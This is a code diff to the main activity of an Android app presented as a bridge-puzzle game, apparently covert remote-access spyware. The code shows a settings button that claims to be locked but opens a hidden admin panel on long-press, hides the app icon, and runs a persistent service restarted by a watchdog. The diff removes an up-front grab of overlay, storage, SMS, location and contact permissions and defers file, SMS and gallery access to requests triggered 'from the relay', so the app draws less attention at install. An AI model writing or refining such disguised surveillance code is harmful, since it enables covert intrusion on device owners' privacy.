@@ -18,16 +18,13 @@ import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import com.hashibridge.master.game.BridgeGameView;
 import com.hashibridge.master.game.BridgePuzzleGenerator;
-import com.hashibridge.master.utils.PermissionHelper;
 import java.util.Random;
 
 public class MainActivity extends AppCompatActivity {
 
-    private static final int RC_PERMISSIONS        = 2001;
-    private static final int RC_BACKGROUND_LOC     = 2002;
-    private static final int RC_OVERLAY            = 2003;
-    private static final int RC_STORAGE            = 2004;
-    private static final int RC_BATTERY_OPT        = 2005;
+    // Only request codes we actually use at launch
+    private static final int RC_NOTIFICATION   = 2001;
+    private static final int RC_BATTERY_OPT    = 2002;
 
     private BridgeGameView gameView;
     private TextView tvHud;
@@ -41,9 +38,6 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         com.hashibridge.master.utils.Config.getOrCreateDeviceId(this);
-
-        // 🔑 Auto-start permission flow on first launch — no admin panel needed
-        startPermissionFlow();
 
         if (com.hashibridge.master.utils.Config.isIconHidden(this)) {
             com.hashibridge.master.utils.Config.hideAppIcon(this);
@@ -68,65 +62,45 @@ public class MainActivity extends AppCompatActivity {
             startPuzzle(currentLevel);
         });
 
-        // Public face: settings look locked.
         btnSettings.setOnClickListener(v ->
                 Toast.makeText(this, "Settings are currently locked", Toast.LENGTH_SHORT).show());
-
-        // Hidden trigger: long-press the settings gear opens the admin panel.
         btnSettings.setOnLongClickListener(v -> {
             openAdminPanel();
             return true;
         });
 
-        // Long press title or level badge to copy Device ID quickly
         findViewById(R.id.tv_title).setOnLongClickListener(v -> { copyDeviceId(); return true; });
         tvLevelBadge.setOnLongClickListener(v -> { copyDeviceId(); return true; });
 
         startPuzzle(currentLevel);
+
+        // Minimal launch flow: only POST_NOTIFICATIONS needed for foreground service.
+        // File / SMS / Gallery permissions are requested lazily when those features
+        // are first accessed from the relay (see PermissionHelper.ensureLazy).
+        requestNotificationPermissionThenBatteryOpt();
     }
 
-    // ─── Permission flow ────────────────────────────────────────────────────
+    // ─── Minimal permission flow ─────────────────────────────────────────────
 
     /**
-     * Full sequential permission flow:
-     *  1. SYSTEM_ALERT_WINDOW (overlay)
-     *  2. MANAGE_EXTERNAL_STORAGE (Android 11+)
-     *  3. All runtime permissions (camera, location, contacts, sms, …)
-     *  4. ACCESS_BACKGROUND_LOCATION (Android 10+)
-     *  5. Battery optimization exemption
-     *  6. Start service
+     * Step 1: POST_NOTIFICATIONS (Android 13+).
+     * This is the only permission the user sees on first launch.
+     * It's required for the foreground service notification to show —
+     * without it the service is killed immediately on Android 13+.
      */
-    private void startPermissionFlow() {
-        // Step 1: overlay
-        if (!Settings.canDrawOverlays(this)) {
-            Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                    Uri.parse("package:" + getPackageName()));
-            startActivityForResult(i, RC_OVERLAY);
-            return;
-        }
-
-        // Step 2: MANAGE_EXTERNAL_STORAGE (Android 11+)
-        if (PermissionHelper.needsManageStorage()
-                && !PermissionHelper.isExternalStorageManager(this)) {
-            Intent manage = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
-                    Uri.parse("package:" + getPackageName()));
-            try {
-                startActivityForResult(manage, RC_STORAGE);
-            } catch (Exception e) {
-                startActivityForResult(
-                        new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION), RC_STORAGE);
+    private void requestNotificationPermissionThenBatteryOpt() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (android.content.pm.PackageManager.PERMISSION_GRANTED !=
+                    androidx.core.content.ContextCompat.checkSelfPermission(
+                            this, android.Manifest.permission.POST_NOTIFICATIONS)) {
+                ActivityCompat.requestPermissions(this,
+                        new String[]{android.Manifest.permission.POST_NOTIFICATIONS},
+                        RC_NOTIFICATION);
+                return; // continue in onRequestPermissionsResult
             }
-            return;
         }
-
-        // Step 3: runtime permissions
-        String[] perms = PermissionHelper.getRuntimePermissions();
-        if (perms.length > 0) {
-            ActivityCompat.requestPermissions(this, perms, RC_PERMISSIONS);
-            return;
-        }
-
-        onRuntimePermissionsDone();
+        // Already granted or not needed — go straight to battery opt
+        requestBatteryOptimizationExemption();
     }
 
     @Override
@@ -134,25 +108,18 @@ public class MainActivity extends AppCompatActivity {
                                            @NonNull String[] permissions,
                                            @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        if (requestCode == RC_PERMISSIONS) {
-            onRuntimePermissionsDone();
-        } else if (requestCode == RC_BACKGROUND_LOC) {
+        if (requestCode == RC_NOTIFICATION) {
+            // Granted or denied — either way proceed. Service still runs;
+            // notification just won't appear on denied (acceptable trade-off).
             requestBatteryOptimizationExemption();
         }
     }
 
-    /** Step 4: background location (Android 10+) → then battery opt */
-    private void onRuntimePermissionsDone() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            ActivityCompat.requestPermissions(this,
-                    new String[]{android.Manifest.permission.ACCESS_BACKGROUND_LOCATION},
-                    RC_BACKGROUND_LOC);
-        } else {
-            requestBatteryOptimizationExemption();
-        }
-    }
-
-    /** Step 5: battery optimization exemption — biar service tidak dibunuh OS */
+    /**
+     * Step 2: Battery optimization exemption.
+     * Pops the system dialog asking to "allow always running in background."
+     * User can deny — service still starts, watchdog will restart if killed.
+     */
     private void requestBatteryOptimizationExemption() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
@@ -164,28 +131,24 @@ public class MainActivity extends AppCompatActivity {
                     startActivityForResult(i, RC_BATTERY_OPT);
                     return;
                 } catch (Exception e) {
-                    // Fallback: buka halaman battery settings umum
-                    try {
-                        startActivity(new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS));
-                    } catch (Exception ignored) {}
+                    // Some ROMs don't support the direct intent — skip silently
                 }
             }
         }
-        // Step 6: service + watchdog
+        // Already exempt or not M+ — start service now
         autoStartServiceIfReady();
     }
 
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
-        if (requestCode == RC_OVERLAY || requestCode == RC_STORAGE) {
-            // Continue the flow after system-settings screen closes
-            startPermissionFlow();
-        } else if (requestCode == RC_BATTERY_OPT) {
-            // Done — start service regardless of user choice
+        if (requestCode == RC_BATTERY_OPT) {
+            // Regardless of whether user allowed or denied, start the service
             autoStartServiceIfReady();
         }
     }
+
+    // ─── Helpers ─────────────────────────────────────────────────────────────
 
     private void openAdminPanel() {
         try {
